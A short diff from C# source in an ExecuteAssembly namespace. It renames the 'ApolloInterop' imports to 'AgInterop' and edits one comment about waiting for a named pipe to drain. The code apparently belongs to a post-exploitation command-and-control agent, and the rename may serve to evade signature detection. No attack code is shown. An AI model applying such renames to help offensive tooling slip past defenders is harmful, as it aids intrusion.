@@ -1,12 +1,12 @@
-﻿using ApolloInterop.Classes;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Classes.IO;
-using ApolloInterop.Constants;
-using ApolloInterop.Enums.ApolloEnums;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Serializers;
-using ApolloInterop.Structs.ApolloStructs;
+﻿using AgInterop.Classes;
+using AgInterop.Classes.Core;
+using AgInterop.Classes.Events;
+using AgInterop.Classes.IO;
+using AgInterop.Constants;
+using AgInterop.Enums.AgCoreEnums;
+using AgInterop.Interfaces;
+using AgInterop.Serializers;
+using AgInterop.Structs.AgCoreStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -75,7 +75,7 @@ namespace ExecuteAssembly
                     pipe.BeginWrite(message, 0, message.Length, OnAsyncMessageSent, pipe);
                 }
 
-                // Wait for all messages to be read by Apollo
+                // Wait for all messages to be read by AgCore
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
